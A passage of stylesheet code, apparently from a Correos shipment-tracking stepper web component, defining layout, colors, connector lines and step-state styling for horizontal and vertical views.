				line-height: 1.375rem;
				font-weight: bold;
				color: var(--_ui-tracking-stepper-blue)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__txt-map.sc-correos-ui-tracking-stepper {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon-map.sc-correos-ui-tracking-stepper {
				margin-left: 5px;
				font-weight: bold;
				color: var(--_ui-tracking-stepper-blue)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: start;
				align-items: flex-start;
				width: 100%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root-graphic.sc-correos-ui-tracking-stepper {
				display: -ms-flexbox;
				display: flex
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				display: -ms-flexbox;
				display: flex;
				width: 100%;
				outline: none;
				cursor: auto
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer--cursor.sc-correos-ui-tracking-stepper {
				cursor: pointer
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer--cursor.sc-correos-ui-tracking-stepper:focus {
				outline: none
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer--cursor.focus-visible.sc-correos-ui-tracking-stepper {
				outline: 1px solid black
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper {
				position: relative;
				display: -ms-flexbox;
				display: flex;
				width: 100%;
				-ms-flex-pack: center;
				justify-content: center;
				width: 2.5rem;
				height: 2.5rem;
				min-width: 2.5rem;
				-ms-flex-align: center;
				align-items: center
			}

			@media (min-width: 640px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper {
					min-width: 2.5rem
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextDone.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevError.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextError.sc-correos-ui-tracking-stepper:after {
				content: "";
				position: absolute;
				width: 35%;
				height: 100%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper:before.secondary,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before.secondary,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextDone.sc-correos-ui-tracking-stepper:after.secondary,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after.secondary,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevError.sc-correos-ui-tracking-stepper:before.secondary,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextError.sc-correos-ui-tracking-stepper:after.secondary {
				width: 15%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before {
				background: -webkit-gradient(linear, left top, left bottom, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-line-done-color)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(180deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-line-done-color) 50%, rgba(255, 255, 255, 0) 53%);
				left: 0;
				top: 0
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before {
				background: -webkit-gradient(linear, left top, left bottom, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-line-undone-color)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(180deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-line-undone-color) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextDone.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextError.sc-correos-ui-tracking-stepper:after {
				right: 0;
				top: 0;
				background: -webkit-gradient(linear, left top, left bottom, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-line-done-color)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(180deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-line-done-color) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after {
				background: -webkit-gradient(linear, left top, left bottom, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-line-undone-color)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(180deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-line-undone-color) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextError.sc-correos-ui-tracking-stepper:after {
				background: -webkit-gradient(linear, left top, left bottom, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-error)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(180deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-error) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.secondary.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper {
				border-radius: 12px;
				border: 0
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.secondary.sc-correos-ui-tracking-stepper .step.done.sc-correos-ui-tracking-stepper {
				background-color: var(--_ui-tracking-stepper-dot-done-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper {
				width: 40px;
				height: 40px;
				border-radius: 20px;
				border: 0;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: center;
				justify-content: center
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.done.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.done.sc-correos-ui-tracking-stepper {
				background-color: var(--_ui-tracking-stepper-dot-active-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.false.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.false.sc-correos-ui-tracking-stepper {
				background-color: var(--_ui-tracking-stepper-error)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.false.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.false.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper:before {
				color: var(--_ui-tracking-stepper-white)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper {
				z-index: 1;
				width: 8px;
				height: 8px;
				background-color: var(--_ui-tracking-stepper-dot-undone-color);
				border-radius: 4px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper:before {
				color: var(--_ui-tracking-stepper-icon-active-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.done.sc-correos-ui-tracking-stepper {
				background-color: var(--_ui-tracking-stepper-dot-done-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper .icon-ok.sc-correos-ui-tracking-stepper {
				font-size: 28px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper .icon-check.sc-correos-ui-tracking-stepper {
				font-size: 37px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper .icon-preadmission.sc-correos-ui-tracking-stepper {
				font-size: 20px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper {
				background-color: var(--_ui-tracking-stepper-error) !important
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper:before {
				color: var(--_ui-tracking-stepper-white)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				margin-left: 24px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__title.sc-correos-ui-tracking-stepper {
				font-size: 1rem;
				line-height: 1.5rem;
				font-weight: bold;
				color: var(--_ui-tracking-stepper-font-color)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__title.sc-correos-ui-tracking-stepper {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__desc.sc-correos-ui-tracking-stepper {
				font-size: 0.875rem;
				line-height: 1.375rem;
				font-weight: 300;
				color: var(--_ui-tracking-stepper-font-color);
				display: block
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__desc.sc-correos-ui-tracking-stepper {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper {
				width: auto;
				max-width: 912px;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap;
				margin-left: 184px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__child-container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__parentcontainer--no-boder-bottom.sc-correos-ui-tracking-stepper {
				border-bottom: 1px solid var(--_ui-tracking-stepper-dot-undone-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__child-container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__body__titlecontent.sc-correos-ui-tracking-stepper {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__child-container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__body--border-bottom.sc-correos-ui-tracking-stepper:after {
				content: none
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__child-container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .tracking-stepper-texticon.sc-correos-ui-tracking-stepper {
				margin-left: 4px;
				font-size: 16px;
				display: block;
				margin-left: 8px;
				color: #348f41
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__root-graphic.sc-correos-ui-tracking-stepper {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap;
				-ms-flex-direction: column;
				flex-direction: column;
				-ms-flex-align: stretch;
				align-items: stretch;
				width: 100%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper {
				border-bottom: 1px solid var(--_ui-tracking-stepper-dot-undone-color);
				position: relative;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer--no-boder-bottom.sc-correos-ui-tracking-stepper {
				border-bottom: 0
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.disabledDiv.sc-correos-ui-tracking-stepper {
				cursor: auto;
				opacity: 0.5;
				pointer-events: none
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper {
				height: auto
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.secondary.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper:not(.primary) .step.sc-correos-ui-tracking-stepper {
				width: 24px;
				height: 24px;
				border: 0;
				border-radius: 12px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.secondary.sc-correos-ui-tracking-stepper .step.done.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper:not(.primary) .step.done.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper:before {
				color: var(--_ui-tracking-stepper-icon-done-color);
				background-color: var(--_ui-tracking-stepper-white)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.secondary.sc-correos-ui-tracking-stepper .step.done.sc-correos-ui-tracking-stepper .icon-close.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper:not(.primary) .step.done.sc-correos-ui-tracking-stepper .icon-close.sc-correos-ui-tracking-stepper:before {
				background-color: var(--_ui-tracking-stepper-error);
				color: var(--_ui-tracking-stepper-white)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper {
				border: 0;
				width: 40px;
				height: 40px;
				border-radius: 20px;
				border: 0
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.false.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.false.sc-correos-ui-tracking-stepper {
				background-color: var(--_ui-tracking-stepper-error);
				border-color: var(--_ui-tracking-stepper-error)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.false.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .step.false.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper:before {
				color: var(--_ui-tracking-stepper-white);
				font-size: 18px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper:not(.done) {
				background-color: var(--_ui-tracking-stepper-white);
				border: 1px solid var(--_ui-tracking-stepper-dot-undone-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper:not(.done) i.sc-correos-ui-tracking-stepper:before {
				color: var(--_ui-tracking-stepper-icon-active-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.error.sc-correos-ui-tracking-stepper .sc-correos-ui-tracking-stepper.step.false.sc-correos-ui-tracking-stepper:not(.done) {
				background-color: var(--_ui-tracking-stepper-error)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.secondary.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.secondary.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextDone.secondary.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.secondary.sc-correos-ui-tracking-stepper:after {
				height: 50%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevError.sc-correos-ui-tracking-stepper:before {
				top: 0;
				height: 50%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevError.sc-correos-ui-tracking-stepper:before {
